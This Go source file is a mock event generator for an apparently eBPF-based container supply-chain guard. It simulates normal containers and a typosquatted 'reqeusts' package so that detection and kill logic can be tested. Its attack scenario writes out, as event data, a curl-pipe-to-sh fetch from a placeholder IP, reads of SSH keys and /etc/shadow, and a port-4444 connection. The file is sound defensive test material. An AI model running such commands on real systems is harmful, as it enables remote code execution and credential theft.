package ingestion

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"math/big"
	"sync"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/enforcer"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
)

// Mock: 커널 없이 대시보드·규칙·격리 흐름을 개발하기 위한 가짜 이벤트 소스.
// 정상 컨테이너 2개와 타이포스쿼팅 패키지를 흉내 낸 컨테이너 1개가 돈다.
// Enforcer도 구현해서, kill하면 해당 컨테이너가 멈췄다가 새 ID로 재기동한다.
type Mock struct {
	mu         sync.Mutex
	containers []*mockContainer
	Interval   time.Duration // 정상 이벤트 간격 (기본 100ms)
	AttackIn   time.Duration // 공격 시나리오 반복 간격 (기본 20s)
	RestartIn  time.Duration // kill 후 재기동까지 (기본 15s)
}

type mockContainer struct {
	id, name, image string
	attacker        bool
	killedAt        time.Time
	normal          []model.Event
}

func NewMock() *Mock {
	return &Mock{
		Interval:  100 * time.Millisecond,
		AttackIn:  20 * time.Second,
		RestartIn: 15 * time.Second,
		containers: []*mockContainer{
			{name: "web-api", image: "node:22-alpine", normal: []model.Event{
				{Kind: model.KindExec, Comm: "node", Args: "node /app/server.js"},
				{Kind: model.KindOpen, Comm: "node", Path: "/app/node_modules/express/index.js"},
				{Kind: model.KindOpen, Comm: "node", Path: "/etc/hosts"},
				{Kind: model.KindConnect, Comm: "node", DstIP: "172.18.0.4", DstPort: 5432},
				{Kind: model.KindConnect, Comm: "node", DstIP: "104.16.2.35", DstPort: 443, DstHost: "api.github.com"},
			}},
			{name: "worker", image: "python:3.12-slim", normal: []model.Event{
				{Kind: model.KindExec, Comm: "python3", Args: "python3 -m worker"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/json/__init__.py"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/tmp/job-queue.lock"},
				{Kind: model.KindConnect, Comm: "python3", DstIP: "172.18.0.5", DstPort: 6379},
			}},
			{name: "pkg-reqeusts", image: "demo/reqeusts:1.0.2", attacker: true, normal: []model.Event{
				{Kind: model.KindExec, Comm: "python3", Args: "python3 -c import reqeusts"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py"},
				{Kind: model.KindConnect, Comm: "python3", DstIP: "151.101.0.223", DstPort: 443, DstHost: "files.pythonhosted.org"},
			}},
		},
	}
}

// attack: 데모 시나리오 1~3 (docs/00-개발-계획.md §7)
var attack = []model.Event{
	{Kind: model.KindExec, Comm: "sh", Args: "sh -c curl -s http://203.0.113.7/p.sh | sh"},
	{Kind: model.KindExec, Comm: "curl", Args: "curl -s http://203.0.113.7/p.sh"},
	{Kind: model.KindOpen, Comm: "python3", Path: "/root/.ssh/id_rsa"},
	{Kind: model.KindOpen, Comm: "python3", Path: "/etc/shadow"},
	{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 8081, DstHost: "cdn.reqeusts-update.test"},
	{Kind: model.KindConnect, Comm: "sh", DstIP: "203.0.113.7", DstPort: 4444, DstHost: "cdn.reqeusts-update.test"},
}

func (m *Mock) Run(ctx context.Context, out chan<- model.Event) error {
	m.mu.Lock()
	for _, c := range m.containers {
		c.id = newID()
	}
	m.mu.Unlock()

	tick := time.NewTicker(m.Interval)
	defer tick.Stop()
	nextAttack := time.Now().Add(5 * time.Second)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case now := <-tick.C:
			m.mu.Lock()
			for _, c := range m.containers {
				if !c.killedAt.IsZero() {
					if now.Sub(c.killedAt) < m.RestartIn {
						continue
					}
					c.killedAt, c.id = time.Time{}, newID() // 재배포된 것처럼 새 ID
				}
				if rnd(3) == 0 {
					send(out, c.event(c.normal[rnd(len(c.normal))], now))
				}
			}
			if now.After(nextAttack) {
				for _, c := range m.containers {
					if c.attacker && c.killedAt.IsZero() {
						for _, a := range attack {
							send(out, c.event(a, now))
						}
					}
				}
				nextAttack = now.Add(m.AttackIn)
			}
			m.mu.Unlock()
		}
	}
}

// Kill: enforcer.Enforcer 구현 — 해당 컨테이너의 이벤트 생성을 멈춘다.
func (m *Mock) Kill(_ context.Context, containerID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, c := range m.containers {
		if c.id == containerID {
			if !c.killedAt.IsZero() {
				return enforcer.ErrNotRunning
			}
			c.killedAt = time.Now()
			return nil
		}
	}
	return enforcer.ErrNotFound
}

var _ enforcer.Enforcer = (*Mock)(nil)

func (c *mockContainer) event(tmpl model.Event, now time.Time) model.Event {
	ev := tmpl
	ev.Timestamp = now.UTC()
	ev.ContainerID, ev.ContainerName, ev.ImageName = c.id, c.name, c.image
	ev.Pid = uint32(1000 + rnd(30000))
	return ev
}

func newID() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		panic(errors.Join(errors.New("crypto/rand"), err))
	}
	return hex.EncodeToString(b)
}

func rnd(n int) int {
	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}
